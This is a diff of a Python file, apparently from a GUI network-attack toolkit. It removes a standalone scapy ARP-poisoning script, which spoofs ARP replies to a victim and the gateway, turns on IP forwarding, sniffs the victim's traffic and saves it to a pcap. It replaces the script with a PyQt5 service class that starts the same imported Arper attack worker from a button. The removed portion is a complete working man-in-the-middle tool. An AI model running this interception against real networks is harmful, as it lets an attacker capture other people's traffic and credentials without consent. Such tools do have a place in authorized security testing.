@@ -1,139 +1,61 @@
-from multiprocessing import Process
-import argparse
-from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)
-# from termcolor import cprint
-import sys
-import time
-import os
+from Service import BaseService
+from PyQt5.QtWidgets import QPushButton, QLineEdit, QTextEdit
+from PyQt5.QtCore import QObject, pyqtSlot, QThreadPool
+from requests import Response
+from Core.mitm import Arper
+from Widgets import ErrorDialog
+from Helpers import DialogRunnable
 
 
-def get_mac(targetip):
-    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
-    try:
-        resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
-    except PermissionError as e:
-        print(f"ERROR: The program must run with root privileges: {e}")
-        exit()
-    for _,  r in resp:
-        return r[Ether].src
-    return None
+class MITMService(BaseService):
+    def __init__(self, main: QObject, button: QPushButton, output: QTextEdit) -> None:
+        super().__init__(main)
+        self.button = button
+        self.output = output
+        self.proc = None
 
+    def before_request(self):
+        self.button.setDisabled(True)
 
-class Arper():
-    def __init__(self, victim, gateway, interface, verbose):
-        self.victim = victim
-        try:
-            self.victimmac = get_mac(victim)
-        except:
-            os.system("sysctl net.ipv4.ip_forward=0")
-            print("[!] Couldn't Find Victim MAC Address ")
-            print("[!] Exiting....")
-            sys.exit(1)
-        self.gateway = gateway
-        try:
-            self.gatewaymac = get_mac(gateway)
-        except:
-            os.system("sudo sysctl net.ipv4.ip_forward=0")
-            print("[!] Couldn't Find Gateway MAC Address ")
-            print("[!] Exiting....")
-            sys.exit(1)
-        self.interface = interface
-        self.verbose = verbose
-        conf.iface = interface
-        conf.verb = 0
+    def onError(self):
+        self.button.setDisabled(False)
 
-        print(f'[!] Initialized {interface}:')
-        print(f'[!] Gateway ({gateway}) is at {self.gatewaymac}.')
-        print(f'[!] Victim ({victim}) is at {self.victimmac}.')
-        print('-'*40)
+    def onResponse(self, **kwargs):
+        res: Response = kwargs['response']
+        self.button.setDisabled(False)
+        print(res)
 
-    def run(self):
-        os.system("sysctl net.ipv4.ip_forward=1")
-        self.poison_thread = Process(target=self.poison)
-        self.poison_thread.start()
+    def start(self, target: str, gateway: str):
+        if not (self.validator.ip(target).validate() and self.validator.ip(gateway).validate()):
+            return
+        self.button.setDisabled(True)
 
-        self.sniff_thread = Process(target=self.sniffer)
-        self.sniff_thread.start()
+        self.worker = Arper(self.main, target, gateway, "eth0", True)
+        self.worker.start()
+        self.worker.output_signal.connect(self.on_output_signal)
+        self.worker.error_signal.connect(self.on_error_signal)
+        self.worker.kill_signal.connect(self.on_kill_signal)
 
-    def poison(self):
-        poison_victim = ARP(op=2, psrc=self.gateway,
-                            pdst=self.victim, hwdst=self.victimmac)
-        print(poison_victim.summary())
-        print('-'*40)
+    def kill(self):
+        self.worker.terminate_signal.emit("terminate")
 
-        poison_gateway = ARP(op=2, psrc=self.victim,
-                             pdst=self.gateway, hwdst=self.gatewaymac)
-        print(poison_gateway.summary())
-        print('-'*40)
-        print("[!] Beginning the ARP poison. [CTRL-C to stop]")
-        while True:
-            if not verbose:
-                sys.stdout.write('.')
-                sys.stdout.flush()
-            try:
-                send(poison_victim)
-                send(poison_gateway)
-                time.sleep(2)
-            except KeyboardInterrupt:
-                self.restore()
-                sys.exit()
+    @pyqtSlot(str)
+    def on_output_signal(self, output: str):
+        self.output.append(output)
 
-    def print_packet(self, packet):
-        print(packet.summary())
+    @pyqtSlot(bool)
+    def on_kill_signal(self, is_kill: bool):
+        if is_kill:
+            self.output.append("TERMINATED")
+            self.worker.quit()
+            self.worker.exit()
+            #self.worker.terminate()
+            self.button.setDisabled(False)
 
-    def sniffer(self):
-        time.sleep(5)
-        bpf_filter = "ip host %s" % victim
-        print("[!] Sniffing packets...")
-        if verbose:
-            try:
-                packets = sniff(filter=bpf_filter,
-                                iface=self.interface, prn=self.print_packet)
-            except Exception as e:
-                print(e)
-        else:
-            try:
-                packets = sniff(filter=bpf_filter, iface=self.interface)
-            except Exception as e:
-                print(e)
-        wrpcap('mitm.pcap', packets)
-        print('[!] Got the packets..')
-        self.poison_thread.terminate()
-        self.restore()
-
-    def restore(self):
-        os.system("sysctl net.ipv4.ip_forward=0")
-        print('[!] Restoring ARP tables...')
-        send(ARP(
-            op=2,
-            psrc=self.gateway,
-            hwsrc=self.gatewaymac,
-            pdst=self.victim,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5)
-        send(ARP(
-            op=2,
-            psrc=self.victim,
-            hwsrc=self.victimmac,
-            pdst=self.gateway,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5)
-        print('[!] Finished...')
-
-
-if __name__ == '__main__':
-    import argparse
-    os.system("clear")
-
-    parser = argparse.ArgumentParser(description="MITM ATTACK")
-    parser.add_argument(
-        "-g", "--gateway", help="Gateway IP for ARP Poisoning attacks", required=True)
-    parser.add_argument("-t", "--target", help="Target_IP", required=True)
-    parser.add_argument(
-        "-i", "--interface", help="Network Interface; default eth0", type=str, default='eth0')
-    parser.add_argument("-v", "--verbose", action="count", default=False)
-    args = parser.parse_args()
-    (victim, gateway, interface, verbose) = (
-        args.target, args.gateway, args.interface, args.verbose)
-    myarp = Arper(victim, gateway, interface, verbose)
-    myarp.run()
+    @pyqtSlot(str)
+    def on_error_signal(self, error: str):
+        self.button.setDisabled(False)
+        dlg = ErrorDialog('Error Occurred', [{'message': error}])
+        runnable = DialogRunnable(self, dlg)
+        QThreadPool.globalInstance().start(runnable)
+        self.kill()
